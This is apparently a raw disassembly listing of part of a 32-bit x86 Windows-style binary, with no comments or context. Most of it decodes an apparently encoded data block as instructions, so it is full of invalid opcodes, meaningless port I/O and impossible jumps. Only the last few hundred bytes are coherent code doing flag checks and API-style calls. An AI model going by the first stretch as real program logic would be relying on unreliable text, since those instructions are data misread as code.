  402c5c:	32 06                	xor    (%esi),%al
  402c5e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c5f:	4a                   	dec    %edx
  402c60:	5e                   	pop    %esi
  402c61:	d9 e9                	fldl2t
  402c63:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402c68:	b7 a8                	mov    $0xa8,%bh
  402c6a:	1e                   	push   %ds
  402c6b:	99                   	cltd
  402c6c:	a8 be                	test   $0xbe,%al
  402c6e:	ed                   	in     (%dx),%eax
  402c6f:	ca ea a9             	lret   $0xa9ea
  402c72:	4c                   	dec    %esp
  402c73:	5e                   	pop    %esi
  402c74:	d9 e9                	fldl2t
  402c76:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402c7b:	a8 be                	test   $0xbe,%al
  402c7d:	e9 ca ea a9 32       	jmp    0x32ea174c
  402c82:	ee                   	out    %al,(%dx)
  402c83:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c84:	34 ee                	xor    $0xee,%al
  402c86:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c87:	32 1e                	xor    (%esi),%bl
  402c89:	9d                   	popf
  402c8a:	4c                   	dec    %esp
  402c8b:	62 d9 e9             	(bad) {%k1}{z}
  402c8e:	a9 32 06 a5 4a       	test   $0x4aa50632,%eax
  402c93:	5e                   	pop    %esi
  402c94:	d9 e9                	fldl2t
  402c96:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402c9b:	b7 a8                	mov    $0xa8,%bh
  402c9d:	1e                   	push   %ds
  402c9e:	99                   	cltd
  402c9f:	a8 be                	test   $0xbe,%al
  402ca1:	ed                   	in     (%dx),%eax
  402ca2:	ca ea a9             	lret   $0xa9ea
  402ca5:	4c                   	dec    %esp
  402ca6:	5e                   	pop    %esi
  402ca7:	d9 e9                	fldl2t
  402ca9:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402cae:	a8 be                	test   $0xbe,%al
  402cb0:	e9 ca ea a9 32       	jmp    0x32ea177f
  402cb5:	ee                   	out    %al,(%dx)
  402cb6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402cb7:	34 f6                	xor    $0xf6,%al
  402cb9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402cba:	70 ee                	jo     0x402caa
  402cbc:	9d                   	popf
  402cbd:	72 d3                	jb     0x402c92
  402cbf:	e9 a9 32 b6 66       	jmp    0x66f65f6d
  402cc4:	d9 e9                	fldl2t
  402cc6:	a9 32 06 a5 4a       	test   $0x4aa50632,%eax
  402ccb:	5e                   	pop    %esi
  402ccc:	d9 e9                	fldl2t
  402cce:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402cd3:	b7 a8                	mov    $0xa8,%bh
  402cd5:	1e                   	push   %ds
  402cd6:	99                   	cltd
  402cd7:	a8 be                	test   $0xbe,%al
  402cd9:	ed                   	in     (%dx),%eax
  402cda:	ca ea a9             	lret   $0xa9ea
  402cdd:	4c                   	dec    %esp
  402cde:	5e                   	pop    %esi
  402cdf:	d9 e9                	fldl2t
  402ce1:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402ce6:	a8 be                	test   $0xbe,%al
  402ce8:	e9 ca ea a9 32       	jmp    0x32ea17b7
  402ced:	ee                   	out    %al,(%dx)
  402cee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402cef:	34 fe                	xor    $0xfe,%al
  402cf1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402cf2:	70 ee                	jo     0x402ce2
  402cf4:	9d                   	popf
  402cf5:	66 d3 e9             	shr    %cl,%cx
  402cf8:	a9 32 be 76 d9       	test   $0xd976be32,%eax
  402cfd:	e9 a9 32 06 a5       	jmp    0xa5465fab
  402d02:	4a                   	dec    %edx
  402d03:	5e                   	pop    %esi
  402d04:	d9 e9                	fldl2t
  402d06:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402d0b:	b7 a8                	mov    $0xa8,%bh
  402d0d:	1e                   	push   %ds
  402d0e:	99                   	cltd
  402d0f:	a8 be                	test   $0xbe,%al
  402d11:	ed                   	in     (%dx),%eax
  402d12:	ca ea a9             	lret   $0xa9ea
  402d15:	4c                   	dec    %esp
  402d16:	5e                   	pop    %esi
  402d17:	d9 e9                	fldl2t
  402d19:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402d1e:	a8 be                	test   $0xbe,%al
  402d20:	e9 ca ea a9 32       	jmp    0x32ea17ef
  402d25:	ee                   	out    %al,(%dx)
  402d26:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d27:	34 ee                	xor    $0xee,%al
  402d29:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d2a:	70 ee                	jo     0x402d1a
  402d2c:	9d                   	popf
  402d2d:	5a                   	pop    %edx
  402d2e:	d3 e9                	shr    %cl,%ecx
  402d30:	a9 4c 7a d9 e9       	test   $0xe9d97a4c,%eax
  402d35:	a9 32 06 a5 4a       	test   $0x4aa50632,%eax
  402d3a:	5e                   	pop    %esi
  402d3b:	d9 e9                	fldl2t
  402d3d:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402d42:	b7 a8                	mov    $0xa8,%bh
  402d44:	1e                   	push   %ds
  402d45:	99                   	cltd
  402d46:	a8 be                	test   $0xbe,%al
  402d48:	ed                   	in     (%dx),%eax
  402d49:	ca ea a9             	lret   $0xa9ea
  402d4c:	4c                   	dec    %esp
  402d4d:	5e                   	pop    %esi
  402d4e:	d9 e9                	fldl2t
  402d50:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402d55:	a8 be                	test   $0xbe,%al
  402d57:	e9 ca ea a9 32       	jmp    0x32ea1826
  402d5c:	ee                   	out    %al,(%dx)
  402d5d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d5e:	34 f6                	xor    $0xf6,%al
  402d60:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d61:	70 ee                	jo     0x402d51
  402d63:	9d                   	popf
  402d64:	4e                   	dec    %esi
  402d65:	d3 e9                	shr    %cl,%ecx
  402d67:	a9 32 b6 7e d9       	test   $0xd97eb632,%eax
  402d6c:	e9 a9 32 06 a5       	jmp    0xa546601a
  402d71:	4a                   	dec    %edx
  402d72:	5e                   	pop    %esi
  402d73:	d9 e9                	fldl2t
  402d75:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402d7a:	b7 a8                	mov    $0xa8,%bh
  402d7c:	1e                   	push   %ds
  402d7d:	99                   	cltd
  402d7e:	a8 be                	test   $0xbe,%al
  402d80:	ed                   	in     (%dx),%eax
  402d81:	ca ea a9             	lret   $0xa9ea
  402d84:	4c                   	dec    %esp
  402d85:	5e                   	pop    %esi
  402d86:	d9 e9                	fldl2t
  402d88:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402d8d:	a8 be                	test   $0xbe,%al
  402d8f:	e9 ca ea a9 32       	jmp    0x32ea185e
  402d94:	ee                   	out    %al,(%dx)
  402d95:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d96:	34 fe                	xor    $0xfe,%al
  402d98:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d99:	70 ee                	jo     0x402d89
  402d9b:	9d                   	popf
  402d9c:	3e d3 e9             	ds shr %cl,%ecx
  402d9f:	a9 32 be 82 d9       	test   $0xd982be32,%eax
  402da4:	e9 a9 32 06 a5       	jmp    0xa5466052
  402da9:	4a                   	dec    %edx
  402daa:	5e                   	pop    %esi
  402dab:	d9 e9                	fldl2t
  402dad:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402db2:	b7 a8                	mov    $0xa8,%bh
  402db4:	1e                   	push   %ds
  402db5:	99                   	cltd
  402db6:	a8 be                	test   $0xbe,%al
  402db8:	ed                   	in     (%dx),%eax
  402db9:	ca ea a9             	lret   $0xa9ea
  402dbc:	4c                   	dec    %esp
  402dbd:	5e                   	pop    %esi
  402dbe:	d9 e9                	fldl2t
  402dc0:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402dc5:	a8 be                	test   $0xbe,%al
  402dc7:	e9 ca ea a9 32       	jmp    0x32ea1896
  402dcc:	ee                   	out    %al,(%dx)
  402dcd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402dce:	34 ee                	xor    $0xee,%al
  402dd0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402dd1:	70 ee                	jo     0x402dc1
  402dd3:	9d                   	popf
  402dd4:	2a d3                	sub    %bl,%dl
  402dd6:	e9 a9 4c 86 d9       	jmp    0xd9c67a84
  402ddb:	e9 a9 32 06 a5       	jmp    0xa5466089
  402de0:	4a                   	dec    %edx
  402de1:	5e                   	pop    %esi
  402de2:	d9 e9                	fldl2t
  402de4:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402de9:	b7 a8                	mov    $0xa8,%bh
  402deb:	1e                   	push   %ds
  402dec:	99                   	cltd
  402ded:	a8 be                	test   $0xbe,%al
  402def:	ed                   	in     (%dx),%eax
  402df0:	ca ea a9             	lret   $0xa9ea
  402df3:	4c                   	dec    %esp
  402df4:	5e                   	pop    %esi
  402df5:	d9 e9                	fldl2t
  402df7:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402dfc:	a8 be                	test   $0xbe,%al
  402dfe:	e9 ca ea a9 32       	jmp    0x32ea18cd
  402e03:	ee                   	out    %al,(%dx)
  402e04:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e05:	34 f6                	xor    $0xf6,%al
  402e07:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e08:	70 ee                	jo     0x402df8
  402e0a:	9d                   	popf
  402e0b:	12 d3                	adc    %bl,%dl
  402e0d:	e9 a9 32 b6 6e       	jmp    0x6ef660bb
  402e12:	d9 e9                	fldl2t
  402e14:	a9 32 06 a5 4a       	test   $0x4aa50632,%eax
  402e19:	5e                   	pop    %esi
  402e1a:	d9 e9                	fldl2t
  402e1c:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402e21:	b7 a8                	mov    $0xa8,%bh
  402e23:	1e                   	push   %ds
  402e24:	99                   	cltd
  402e25:	a8 be                	test   $0xbe,%al
  402e27:	ed                   	in     (%dx),%eax
  402e28:	ca ea a9             	lret   $0xa9ea
  402e2b:	4c                   	dec    %esp
  402e2c:	5e                   	pop    %esi
  402e2d:	d9 e9                	fldl2t
  402e2f:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402e34:	a8 be                	test   $0xbe,%al
  402e36:	e9 ca ea a9 32       	jmp    0x32ea1905
  402e3b:	ee                   	out    %al,(%dx)
  402e3c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e3d:	34 fe                	xor    $0xfe,%al
  402e3f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e40:	70 ee                	jo     0x402e30
  402e42:	9d                   	popf
  402e43:	fe                   	(bad)
  402e44:	d3 e9                	shr    %cl,%ecx
  402e46:	a9 32 be 8a d9       	test   $0xd98abe32,%eax
  402e4b:	e9 a9 32 06 a5       	jmp    0xa54660f9
  402e50:	4a                   	dec    %edx
  402e51:	5e                   	pop    %esi
  402e52:	d9 e9                	fldl2t
  402e54:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402e59:	b7 a8                	mov    $0xa8,%bh
  402e5b:	1e                   	push   %ds
  402e5c:	99                   	cltd
  402e5d:	a8 be                	test   $0xbe,%al
  402e5f:	ed                   	in     (%dx),%eax
  402e60:	ca ea a9             	lret   $0xa9ea
  402e63:	4c                   	dec    %esp
  402e64:	5e                   	pop    %esi
  402e65:	d9 e9                	fldl2t
  402e67:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402e6c:	a8 be                	test   $0xbe,%al
  402e6e:	e9 ca ea a9 32       	jmp    0x32ea193d
  402e73:	ee                   	out    %al,(%dx)
  402e74:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e75:	34 ee                	xor    $0xee,%al
  402e77:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e78:	70 ee                	jo     0x402e68
  402e7a:	9d                   	popf
  402e7b:	f2 d3 e9             	repnz shr %cl,%ecx
  402e7e:	a9 4c 92 d9 e9       	test   $0xe9d9924c,%eax
  402e83:	a9 32 06 a5 4a       	test   $0x4aa50632,%eax
  402e88:	5e                   	pop    %esi
  402e89:	d9 e9                	fldl2t
  402e8b:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  402e90:	b7 a8                	mov    $0xa8,%bh
  402e92:	1e                   	push   %ds
  402e93:	99                   	cltd
  402e94:	a8 be                	test   $0xbe,%al
  402e96:	ed                   	in     (%dx),%eax
  402e97:	ca ea a9             	lret   $0xa9ea
  402e9a:	4c                   	dec    %esp
  402e9b:	5e                   	pop    %esi
  402e9c:	d9 e9                	fldl2t
  402e9e:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  402ea3:	a8 be                	test   $0xbe,%al
  402ea5:	e9 ca ea a9 32       	jmp    0x32ea1974
  402eaa:	ee                   	out    %al,(%dx)
  402eab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402eac:	34 f6                	xor    $0xf6,%al
  402eae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402eaf:	36 3e e5 a7          	ss ds in $0xa7,%eax
  402eb3:	a8 a8                	test   $0xa8,%al
  402eb5:	11 d5                	adc    %edx,%ebp
  402eb7:	aa                   	stos   %al,%es:(%edi)
  402eb8:	a9 a9 fb 32 b6       	test   $0xb632fba9,%eax
  402ebd:	8e d9                	mov    %ecx,%ds
  402ebf:	e9 a9 a8 be 8a       	jmp    0x8afed76d
  402ec4:	d9 e9                	fldl2t
  402ec6:	a9 36 2e d1 a2       	test   $0xa2d12e36,%eax
  402ecb:	a8 a8                	test   $0xa8,%al
  402ecd:	11 91 ac a9 a9 f9    	adc    %edx,-0x6565654(%ecx)
  402ed3:	fc                   	cld
  402ed4:	a8 be                	test   $0xbe,%al
  402ed6:	6e                   	outsb  %ds:(%esi),(%dx)
  402ed7:	d9 e9                	fldl2t
  402ed9:	a9 33 36 e5 a7       	test   $0xa7e53633,%eax
  402ede:	a8 a8                	test   $0xa8,%al
  402ee0:	36 3e b9 a6 a8 a8 fc 	ss ds mov $0xfca8a8a6,%ecx
  402ee7:	fb                   	sti
  402ee8:	31 36                	xor    %esi,(%esi)
  402eea:	b9 a6 a8 a8 a8       	mov    $0xa8a8a8a6,%ecx
  402eef:	be 92 d9 e9 a9       	mov    $0xa9e9d992,%esi
  402ef4:	2c 72                	sub    $0x72,%al
  402ef6:	a8 36                	test   $0x36,%al
  402ef8:	66 b9 a6 a8          	mov    $0xa8a6,%cx
  402efc:	a8 dc                	test   $0xdc,%al
  402efe:	69 36 3e e5 a7 a8    	imul   $0xa8a7e53e,(%esi),%esi
  402f04:	a8 9b                	test   $0x9b,%al
  402f06:	57                   	push   %edi
  402f07:	a0 7a d4 a2 34       	mov    0x34a2d47a,%al
  402f0c:	6a 34                	push   $0x34
  402f0e:	a0 34 a3 36 3e       	mov    0x3e36a334,%al
  402f13:	e5 a7                	in     $0xa7,%eax
  402f15:	a8 a8                	test   $0xa8,%al
  402f17:	6a 92                	push   $0xffffff92
  402f19:	ab                   	stos   %eax,%es:(%edi)
  402f1a:	9c                   	pushf
  402f1b:	4e                   	dec    %esi
  402f1c:	34 71                	xor    $0x71,%al
  402f1e:	dc 69 2c             	fsubrl 0x2c(%ecx)
  402f21:	8a ac 9c 4d 68 ee d3 	mov    -0x2c1197b3(%esp,%ebx,4),%ch
  402f28:	e9 a9 2c 72 a8       	jmp    0xa8b25bd6
  402f2d:	9b                   	fwait
  402f2e:	57                   	push   %edi
  402f2f:	a0 7a d4 a2 34       	mov    0x34a2d47a,%al
  402f34:	a0 34 a3 34 7a       	mov    0x7a34a334,%al
  402f39:	2c 72                	sub    $0x72,%al
  402f3b:	a8 9b                	test   $0x9b,%al
  402f3d:	57                   	push   %edi
  402f3e:	34 73                	xor    $0x73,%al
  402f40:	f8                   	clc
  402f41:	6a 92                	push   $0xffffff92
  402f43:	ab                   	stos   %eax,%es:(%edi)
  402f44:	9c                   	pushf
  402f45:	4e                   	dec    %esi
  402f46:	34 73                	xor    $0x73,%al
  402f48:	36 3e e5 a7          	ss ds in $0xa7,%eax
  402f4c:	a8 a8                	test   $0xa8,%al
  402f4e:	2c 8a                	sub    $0x8a,%al
  402f50:	ac                   	lods   %ds:(%esi),%al
  402f51:	9c                   	pushf
  402f52:	4d                   	dec    %ebp
  402f53:	68 de d3 e9 a9       	push   $0xa9e9d3de
  402f58:	2c 72                	sub    $0x72,%al
  402f5a:	a8 9b                	test   $0x9b,%al
  402f5c:	57                   	push   %edi
  402f5d:	a0 7a d4 a2 34       	mov    0x34a2d47a,%al
  402f62:	a0 34 a3 34 7a       	mov    0x7a34a334,%al
  402f67:	2c 72                	sub    $0x72,%al
  402f69:	a8 9b                	test   $0x9b,%al
  402f6b:	57                   	push   %edi
  402f6c:	34 73                	xor    $0x73,%al
  402f6e:	f8                   	clc
  402f6f:	6a 92                	push   $0xffffff92
  402f71:	ab                   	stos   %eax,%es:(%edi)
  402f72:	9c                   	pushf
  402f73:	4e                   	dec    %esi
  402f74:	4a                   	dec    %edx
  402f75:	ca d3 e9             	lret   $0xe9d3
  402f78:	a9 34 73 2c 8a       	test   $0x8a2c7334,%eax
  402f7d:	ac                   	lods   %ds:(%esi),%al
  402f7e:	f9                   	stc
  402f7f:	9c                   	pushf
  402f80:	4d                   	dec    %ebp
  402f81:	13 b1 a8 be 86 d9    	adc    -0x26794158(%ecx),%esi
  402f87:	e9 a9 f9 a8 be       	jmp    0xbee92935
  402f8c:	7e d9                	jle    0x402f67
  402f8e:	e9 a9 36 36 11       	jmp    0x1176663c
  402f93:	a8 a8                	test   $0xa8,%al
  402f95:	a8 fc                	test   $0xfc,%al
  402f97:	36 3e d1 a2 a8 a8 fa 	ss shll $1,%ds:-0x4055758(%edx)
  402f9e:	fb 
  402f9f:	34 99                	xor    $0x99,%al
  402fa1:	a8 be                	test   $0xbe,%al
  402fa3:	62 d9 e9             	(bad) {%k1}{z}
  402fa6:	a9 34 a1 4a c6       	test   $0xc64aa134,%eax
  402fab:	d3 e9                	shr    %cl,%ecx
  402fad:	a9 fc fc f9 00       	test   $0xf9fcfc,%eax
  402fb2:	a8 be                	test   $0xbe,%al
  402fb4:	76 d9                	jbe    0x402f8f
  402fb6:	e9 a9 34 be ca       	jmp    0xcafe6464
  402fbb:	d3 e9                	shr    %cl,%ecx
  402fbd:	a9 36 f6 a1 fc       	test   $0xfca1f636,%eax
  402fc2:	fa                   	cli
  402fc3:	fb                   	sti
  402fc4:	ff 00                	incl   (%eax)
  402fc6:	a8 be                	test   $0xbe,%al
  402fc8:	7a d9                	jp     0x402fa3
  402fca:	e9 a9 00 a8 be       	jmp    0xbee83078
  402fcf:	6a d9                	push   $0xffffffd9
  402fd1:	e9 a9 36 2e 11       	jmp    0x116e667f
  402fd6:	a8 a8                	test   $0xa8,%al
  402fd8:	a8 11                	test   $0x11,%al
  402fda:	aa                   	stos   %al,%es:(%edi)
  402fdb:	b9 a9 a9 36 36       	mov    $0x3636a9a9,%ecx
  402fe0:	e5 a7                	in     $0xa7,%eax
  402fe2:	a8 a8                	test   $0xa8,%al
  402fe4:	f9                   	stc
  402fe5:	fa                   	cli
  402fe6:	a8 be                	test   $0xbe,%al
  402fe8:	62 d9 e9             	(bad) {%k1}{z}
  402feb:	a9 34 a1 2c a8       	test   $0xa82ca134,%eax
  402ff0:	a8 1d                	test   $0x1d,%al
  402ff2:	e3 34                	jecxz  0x403028
  402ff4:	b6 ca                	mov    $0xca,%dh
  402ff6:	d3 e9                	shr    %cl,%ecx
  402ff8:	a9 dc 69 e4 74       	test   $0x74e469dc,%eax
  402ffd:	27                   	daa
  402ffe:	c2 33 be             	ret    $0xbe33
  403001:	ce                   	into
  403002:	d3 e9                	shr    %cl,%ecx
  403004:	a9 33 b5 d9 d3       	test   $0xd3d9b533,%eax
  403009:	73 31                	jae    0x40303c
  40300b:	b5 d9                	mov    $0xd9,%ch
  40300d:	34 b6                	xor    $0xb6,%al
  40300f:	ca d3 e9             	lret   $0xe9d3
  403012:	a9 e9 e4 6a 25       	test   $0x256ae4e9,%eax
  403017:	90                   	nop
  403018:	36 ee                	ss out %al,(%dx)
  40301a:	a1 fc f9 fa ff       	mov    0xfffaf9fc,%eax
  40301f:	00 a8 be 66 d9 e9    	add    %ch,-0x16269942(%eax)
  403025:	a9 00 a8 be 6a       	test   $0x6abea800,%eax
  40302a:	d9 e9                	fldl2t
  40302c:	a9 ff 13 aa a8       	test   $0xa8aa13ff,%eax
  403031:	be 86 d9 e9 a9       	mov    $0xa9e9d986,%esi
  403036:	f9                   	stc
  403037:	a8 be                	test   $0xbe,%al
  403039:	82 d9 e9             	sbb    $0xe9,%cl
  40303c:	a9 34 b6 5e d9       	test   $0xd95eb634,%eax
  403041:	e9 a9 fa a8 be       	jmp    0xbee92aef
  403046:	8e d9                	mov    %ecx,%ds
  403048:	e9 a9 36 3e e5       	jmp    0xe57e66f6
  40304d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40304e:	a8 a8                	test   $0xa8,%al
  403050:	32 c6                	xor    %dh,%al
  403052:	5e                   	pop    %esi
  403053:	d9 e9                	fldl2t
  403055:	a9 32 fe 99 70       	test   $0x7099fe32,%eax
  40305a:	ee                   	out    %al,(%dx)
  40305b:	9d                   	popf
  40305c:	d2 d3                	rcl    %cl,%bl
  40305e:	e9 a9 32 06 a5       	jmp    0xa546630c
  403063:	4a                   	dec    %edx
  403064:	5e                   	pop    %esi
  403065:	d9 e9                	fldl2t
  403067:	a9 2c a1 a9 1e       	test   $0x1ea9a12c,%eax
  40306c:	b7 a8                	mov    $0xa8,%bh
  40306e:	1e                   	push   %ds
  40306f:	99                   	cltd
  403070:	a8 be                	test   $0xbe,%al
  403072:	ed                   	in     (%dx),%eax
  403073:	ca ea a9             	lret   $0xa9ea
  403076:	4c                   	dec    %esp
  403077:	5e                   	pop    %esi
  403078:	d9 e9                	fldl2t
  40307a:	a9 a8 1e 9d f9       	test   $0xf99d1ea8,%eax
  40307f:	a8 be                	test   $0xbe,%al
  403081:	e9 ca ea a9 32       	jmp    0x32ea1b50
  403086:	ee                   	out    %al,(%dx)
  403087:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403088:	34 ee                	xor    $0xee,%al
  40308a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40308b:	e4 6c                	in     $0x6c,%al
  40308d:	4c                   	dec    %esp
  40308e:	72 d9                	jb     0x403069
  403090:	e9 a9 1d ab a8       	jmp    0xa8eb4e3e
  403095:	79 4a                	jns    0x4030e1
  403097:	5e                   	pop    %esi
  403098:	d9 e9                	fldl2t
  40309a:	a9 f9 a8 be 8e       	test   $0x8ebea8f9,%eax
  40309f:	d9 e9                	fldl2t
  4030a1:	a9 08 07 dc 69       	test   $0x69dc0708,%eax
  4030a6:	04 34                	add    $0x34,%al
  4030a8:	8e 06                	mov    (%esi),%es
  4030aa:	6b b9 a9 39 39 39 39 	imul   $0x39,0x393939a9(%ecx),%edi
  4030b1:	39 39                	cmp    %edi,(%ecx)
  4030b3:	39 39                	cmp    %edi,(%ecx)
  4030b5:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030ba:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030bf:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030c4:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030c9:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030ce:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030d3:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030d8:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030dd:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030e2:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030e7:	a9 a9 a9 a9 a9       	test   $0xa9a9a9a9,%eax
  4030ec:	a9 a9 a9 a9 00       	test   $0xa9a9a9,%eax
  4030f1:	00 88 0b 00 00 8b    	add    %cl,-0x74fffff5(%eax)
  4030f7:	55                   	push   %ebp
  4030f8:	e0 8b                	loopne 0x403085
  4030fa:	5d                   	pop    %ebp
  4030fb:	e8 c7 45 e8 00       	call   0x12876c7
  403100:	00 00                	add    %al,(%eax)
  403102:	00 83 4d e4 08 e8    	add    %al,-0x17f71bb3(%ebx)
  403108:	e0 0f                	loopne 0x403119
  40310a:	00 00                	add    %al,(%eax)
  40310c:	72 0d                	jb     0x40311b
  40310e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403111:	e9 46 ff ff ff       	jmp    0x40305c
  403116:	ba 2b 08 00 00       	mov    $0x82b,%edx
  40311b:	ff 0d 9c aa 40 00    	decl   0x40aa9c
  403121:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403124:	a3 ac aa 40 00       	mov    %eax,0x40aaac
  403129:	81 ca 00 00 00 10    	or     $0x10000000,%edx
  40312f:	f9                   	stc
  403130:	c3                   	ret
  403131:	f7 45 e4 08 00 00 00 	testl  $0x8,-0x1c(%ebp)
  403138:	74 dc                	je     0x403116
  40313a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40313d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403140:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%edx)
  403147:	89 42 1c             	mov    %eax,0x1c(%edx)
  40314a:	ff 0d 9c aa 40 00    	decl   0x40aa9c
  403150:	f8                   	clc
  403151:	c3                   	ret
  403152:	83 7a 0c 00          	cmpl   $0x0,0xc(%edx)
  403156:	75 20                	jne    0x403178
  403158:	66 8b 5a 14          	mov    0x14(%edx),%bx
  40315c:	81 e3 ff ff 00 00    	and    $0xffff,%ebx
  403162:	66 83 eb 02          	sub    $0x2,%bx
  403166:	72 10                	jb     0x403178
  403168:	c1 e3 04             	shl    $0x4,%ebx
  40316b:	03 1d 64 aa 40 00    	add    0x40aa64,%ebx
  403171:	83 3b 03             	cmpl   $0x3,(%ebx)
  403174:	74 02                	je     0x403178
  403176:	f9                   	stc
  403177:	c3                   	ret
  403178:	f8                   	clc
  403179:	c3                   	ret
  40317a:	8b 15 94 ab 40 00    	mov    0x40ab94,%edx
  403180:	39 d7                	cmp    %edx,%edi
  403182:	77 12                	ja     0x403196
  403184:	3b 3d 88 ab 40 00    	cmp    0x40ab88,%edi
  40318a:	72 0a                	jb     0x403196
  40318c:	39 15 90 ab 40 00    	cmp    %edx,0x40ab90
  403192:	75 02                	jne    0x403196
  403194:	31 d2                	xor    %edx,%edx
  403196:	c3                   	ret
  403197:	56                   	push   %esi
  403198:	89 35 8c aa 40 00    	mov    %esi,0x40aa8c
  40319e:	8b 5e 0c             	mov    0xc(%esi),%ebx
  4031a1:	8b 76 08             	mov    0x8(%esi),%esi
  4031a4:	89 f7                	mov    %esi,%edi
  4031a6:	01 df                	add    %ebx,%edi
  4031a8:	80 0d ca ab 40 00 10 	orb    $0x10,0x40abca
  4031af:	e8 29 36 00 00       	call   0x4067dd
  4031b4:	72 6f                	jb     0x403225
  4031b6:	6a 00                	push   $0x0
  4031b8:	6a 00                	push   $0x0
  4031ba:	6a 00                	push   $0x0
  4031bc:	6a 02                	push   $0x2
  4031be:	6a 00                	push   $0x0
  4031c0:	ff 35 c4 aa 40 00    	push   0x40aac4
  4031c6:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  4031cd:	74 08                	je     0x4031d7
  4031cf:	ff 15 54 90 40 00    	call   *0x409054
  4031d5:	eb 05                	jmp    0x4031dc
  4031d7:	e8 60 ee 00 00       	call   0x41203c
  4031dc:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  4031e1:	09 c0                	or     %eax,%eax
  4031e3:	74 40                	je     0x403225
  4031e5:	5e                   	pop    %esi
  4031e6:	89 46 1c             	mov    %eax,0x1c(%esi)
  4031e9:	6a 00                	push   $0x0
  4031eb:	6a 00                	push   $0x0
  4031ed:	6a 00                	push   $0x0
  4031ef:	6a 04                	push   $0x4
  4031f1:	50                   	push   %eax
  4031f2:	e8 4b ee 00 00       	call   0x412042
  4031f7:	89 46 18             	mov    %eax,0x18(%esi)
  4031fa:	a3 1c ab 40 00       	mov    %eax,0x40ab1c
  4031ff:	89 1d 20 ab 40 00    	mov    %ebx,0x40ab20
  403205:	8b 15 c4 aa 40 00    	mov    0x40aac4,%edx
  40320b:	89 56 14             	mov    %edx,0x14(%esi)
  40320e:	66 c7 46 34 00 00    	movw   $0x0,0x34(%esi)
  403214:	66 c7 46 36 01 00    	movw   $0x1,0x36(%esi)
  40321a:	89 5e 30             	mov    %ebx,0x30(%esi)
  40321d:	e8 ef 4e 00 00       	call   0x408111
  403222:	72 1b                	jb     0x40323f
  403224:	c3                   	ret
  403225:	52                   	push   %edx
  403226:	8b 0d c4 aa 40 00    	mov    0x40aac4,%ecx
  40322c:	e3 06                	jecxz  0x403234
  40322e:	51                   	push   %ecx
  40322f:	e8 f0 ed 00 00       	call   0x412024
  403234:	5a                   	pop    %edx
  403235:	09 d2                	or     %edx,%edx
  403237:	74 14                	je     0x40324d
  403239:	81 ca 00 00 00 08    	or     $0x8000000,%edx
  40323f:	e8 b0 0c 00 00       	call   0x403ef4
  403244:	5e                   	pop    %esi
  403245:	c7 06 04 00 00 00    	movl   $0x4,(%esi)
  40324b:	eb 01                	jmp    0x40324e
